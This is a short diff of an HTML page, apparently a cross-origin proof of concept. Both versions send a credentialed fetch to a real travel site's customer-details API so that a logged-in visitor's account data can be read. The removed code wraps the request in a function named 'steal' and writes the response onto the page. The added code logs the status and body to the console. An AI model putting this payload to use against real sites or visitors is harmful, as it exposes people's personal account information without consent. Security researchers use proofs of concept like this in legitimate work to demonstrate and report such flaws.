@@ -8,16 +8,12 @@
 <pre id="out"></pre>
 
 <script>
-function steal() {
-  fetch("https://api.headout.com/api/v2/account/get/customer-details?base-currency=INR", {
-    credentials: "include"
-  })
-  .then(r => r.text())
-  .then(data => {
-    document.getElementById("out").innerText = data;
-  })
-  .catch(e => console.log(e));
-}
+fetch("https://api.headout.com/api/v2/account/get/customer-details?base-currency=INR", {
+  credentials: "include"
+}).then(r => {
+  console.log("Status:", r.status);
+  return r.text();
+}).then(t => console.log(t));
 </script>
 
 </body>
